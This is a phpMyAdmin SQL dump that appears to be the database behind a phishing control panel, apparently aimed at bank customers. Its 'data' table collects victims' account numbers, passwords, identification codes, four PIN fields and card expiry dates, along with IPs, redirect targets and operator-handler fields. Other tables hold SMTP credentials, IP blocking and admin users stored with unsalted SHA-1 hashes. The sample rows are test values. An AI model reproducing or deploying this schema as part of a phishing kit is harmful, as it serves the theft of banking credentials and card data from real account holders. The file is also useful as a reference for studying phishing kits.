-- phpMyAdmin SQL Dump
-- version 4.8.3
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Generation Time: Oct 15, 2018 at 07:43 AM
-- Server version: 10.1.36-MariaDB
-- PHP Version: 5.6.38

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `v`
--

-- --------------------------------------------------------

--
-- Table structure for table `credentials`
--

CREATE TABLE `credentials` (
  `id` int(11) NOT NULL,
  `email` varchar(100) NOT NULL,
  `from_email` varchar(100) NOT NULL,
  `host` varchar(100) NOT NULL,
  `password` varchar(100) NOT NULL,
  `user_name` varchar(100) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `credentials`
--

INSERT INTO `credentials` (`id`, `email`, `from_email`, `host`, `password`, `user_name`) VALUES
(1, 'test@email.com', 'test@email.com', 'smtp.host.com', 'password', 'username');

-- --------------------------------------------------------

--
-- Table structure for table `data`
--

CREATE TABLE `data` (
  `id` int(11) NOT NULL,
  `login_type` int(1) DEFAULT NULL,
  `account_number` varchar(100) DEFAULT NULL,
  `password` varchar(100) DEFAULT NULL,
  `identification_code` varchar(10) DEFAULT NULL,
  `response` varchar(10) DEFAULT NULL,
  `text1` varchar(100) DEFAULT NULL,
  `text2` varchar(100) DEFAULT NULL,
  `day` varchar(5) DEFAULT NULL,
  `month` varchar(10) DEFAULT NULL,
  `year` varchar(10) DEFAULT NULL,
  `pin1` varchar(10) DEFAULT NULL,
  `pin2` varchar(10) DEFAULT NULL,
  `pin3` varchar(10) DEFAULT NULL,
  `pin4` varchar(10) DEFAULT NULL,
  `unique_id` varchar(20) DEFAULT NULL,
  `status` int(1) NOT NULL DEFAULT '0',
  `user_id` int(11) DEFAULT NULL,
  `redirect1` varchar(100) DEFAULT NULL,
  `expiry_month` varchar(20) DEFAULT NULL,
  `expiry_year` varchar(20) DEFAULT NULL,
  `verzenden` varchar(100) DEFAULT NULL,
  `response2` varchar(28) DEFAULT NULL,
  `redirect` varchar(100) DEFAULT NULL,
  `last_online` varchar(100) DEFAULT NULL,
  `date` varchar(100) DEFAULT NULL,
  `ip` varchar(100) DEFAULT NULL,
  `blink` int(1) NOT NULL DEFAULT '0',
  `handler_id` int(11) DEFAULT NULL,
  `handler_time` int(11) DEFAULT NULL,
  `mode` int(11) NOT NULL DEFAULT '1'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `data`
--

INSERT INTO `data` (`id`, `login_type`, `account_number`, `password`, `identification_code`, `response`, `text1`, `text2`, `day`, `month`, `year`, `pin1`, `pin2`, `pin3`, `pin4`, `unique_id`, `status`, `user_id`, `redirect1`, `expiry_month`, `expiry_year`, `verzenden`, `response2`, `redirect`, `last_online`, `date`, `ip`, `blink`, `handler_id`, `handler_time`, `mode`) VALUES
(1, 2, 'asdfas@lasdf.com', 'ksadjf', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '5bc38a7fdb1cc', 1, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1539541631', '2018-10-14 20:27:11 pm', '', 0, NULL, NULL, 2),
(2, 2, 'alpesh@boss', 'bossman', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '5bc428527494f', 1, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1539582034', '2018-10-15 07:40:34 am', '', 0, NULL, NULL, 2);

-- --------------------------------------------------------

--
-- Table structure for table `ips`
--

CREATE TABLE `ips` (
  `id` int(11) NOT NULL,
  `ip` varchar(30) NOT NULL,
  `is_block` int(1) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `ips`
--

INSERT INTO `ips` (`id`, `ip`, `is_block`) VALUES
(2, '', 1),
(3, '', 1),
(4, '', 1);

-- --------------------------------------------------------

--
-- Table structure for table `mode`
--

CREATE TABLE `mode` (
  `id` int(11) NOT NULL,
  `value` varchar(100) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `mode`
--

INSERT INTO `mode` (`id`, `value`) VALUES
(1, '1');

-- --------------------------------------------------------

--
-- Table structure for table `sound`
--

CREATE TABLE `sound` (
  `id` int(11) NOT NULL,
  `value` varchar(10) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `sound`
--

INSERT INTO `sound` (`id`, `value`) VALUES
(1, '0');

-- --------------------------------------------------------

--
-- Table structure for table `sound1`
--

CREATE TABLE `sound1` (
  `id` int(11) NOT NULL,
  `value` int(11) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `sound1`
--

INSERT INTO `sound1` (`id`, `value`) VALUES
(1, 0);

-- --------------------------------------------------------

--
-- Table structure for table `user`
--

CREATE TABLE `user` (
  `id` int(11) NOT NULL,
  `username` varchar(100) NOT NULL,
  `password` varchar(100) NOT NULL,
  `role` varchar(10) NOT NULL,
  `color` varchar(50) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `user`
--

INSERT INTO `user` (`id`, `username`, `password`, `role`, `color`) VALUES
(1, 'lodo', 'd033e22ae348aeb5660fc2140aec35850c4da997', '1', 'red'),
(4, 'moderator', '79f52b5b92498b00cb18284f1dcb466bd40ad559', 'moderator', 'bhuro'),
(5, 'admin', 'd033e22ae348aeb5660fc2140aec35850c4da997', 'admin', 'blue'),
(6, 'admin2', 'd033e22ae348aeb5660fc2140aec35850c4da997', 'admin', 'blue');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `credentials`
--
ALTER TABLE `credentials`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `data`
--
ALTER TABLE `data`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `ips`
--
ALTER TABLE `ips`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `mode`
--
ALTER TABLE `mode`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `sound`
--
ALTER TABLE `sound`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `sound1`
--
ALTER TABLE `sound1`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `user`
--
ALTER TABLE `user`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `credentials`
--
ALTER TABLE `credentials`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `data`
--
ALTER TABLE `data`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `ips`
--
ALTER TABLE `ips`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `mode`
--
ALTER TABLE `mode`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `sound`
--
ALTER TABLE `sound`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `sound1`
--
ALTER TABLE `sound1`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `user`
--
ALTER TABLE `user`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
